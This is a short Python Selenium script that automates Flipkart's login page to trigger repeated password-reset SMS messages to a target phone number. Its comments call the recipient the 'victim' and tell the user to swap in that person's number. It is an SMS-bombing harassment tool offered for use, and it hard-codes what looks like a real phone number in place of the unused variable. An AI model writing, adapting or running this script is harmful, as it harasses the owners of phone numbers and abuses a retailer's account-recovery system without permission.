from selenium import webdriver
import time

from selenium.webdriver.common.by import By

# create instance of Chrome webdriver
browser = webdriver.Firefox()

# set the frequency of sms which is approx maximum to 10 per 24 days
frequency = 10

# target mobile number, change it to victim's number and
# also ensure that it's registered on flipkart
mobile_number = "1234567890"

for i in range(frequency):
    browser.get('https://www.flipkart.com/account/login?ret=/')

    # find the element where we have to
    # enter the number using the class name
    number = browser.find_element(By.XPATH, "/html/body/div/div/div[3]/div/div[2]/div/form/div[1]/input")

    # automatically type the target number
    number.send_keys("9686038349")

    # find the element to send a forgot password
    # request using it's class name
    forgot = browser.find_element(By.XPATH, "/html/body/div/div/div[3]/div/div[2]/div/form/div[3]/button")

    # clicking on that element
    forgot.click()

    # set the interval to send each sms
    time.sleep(2)

# Close the browser
browser.quit()